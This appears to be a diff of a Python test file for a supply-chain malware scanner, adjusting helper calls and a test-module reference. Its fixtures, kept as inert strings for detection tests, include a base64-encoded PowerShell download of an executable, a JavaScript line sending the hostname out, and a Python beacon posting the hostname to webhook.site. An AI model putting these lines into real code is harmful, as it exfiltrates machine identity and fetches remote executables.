@@ -11,7 +11,8 @@ no library needs; a download-and-run is CRITICAL in a setup.py and when the
 file is run with Python. The dependency decode flow reads a decoder imported
 under another name and `.decrypt(` calls. The native engine (which the npm
 package runs) is held to these by js/test/supply-chain-signals.test.js and,
-on a random corpus, by tests/architecture/test_rust_parity_hooks.py.
+on a random corpus, to its recorded outputs by
+tests/architecture/test_snapshot_hooks.py.
 
 Everything is inert text: hosts are .invalid, nothing is decoded into a file
 or executed.
@@ -20,7 +21,7 @@ import base64
 import time
 import unittest
 
-from tests import _support  # noqa: F401
+from tests import _support
 from lazaret.scanner import core
 
 PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
@@ -151,7 +152,7 @@ class FlowNamesTests(unittest.TestCase):
 
     def test_a_long_text_follows_a_name_near_its_data(self):
         filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
-        self.assertGreater(len(filler), core._LD_LONG)
+        self.assertGreater(len(filler), _support.pack("_LD_LONG"))
         payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + self.SEND % "JSON.stringify(data)"
         self.assertEqual(self.kind(filler + payload + filler), ("identity", "hostname"))
         far = "var data = {h: require('os').hostname()};\n" + filler + self.SEND % "JSON.stringify(data)"
@@ -589,7 +590,7 @@ class BoundsTests(unittest.TestCase):
             t0 = time.monotonic()
             core.install_script_risk(text)
             core.import_time_risk(text)
-            core._decoder_aliases(text)
+            core.decoded_view(text)
             self.assertLess(time.monotonic() - t0, 10, text[:20])
         beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
         for tail in (" " * 200_000 + "'a' " * 50_000, "x = 1; " + "'a'; " * 60_000, "#\n" * 100_000,
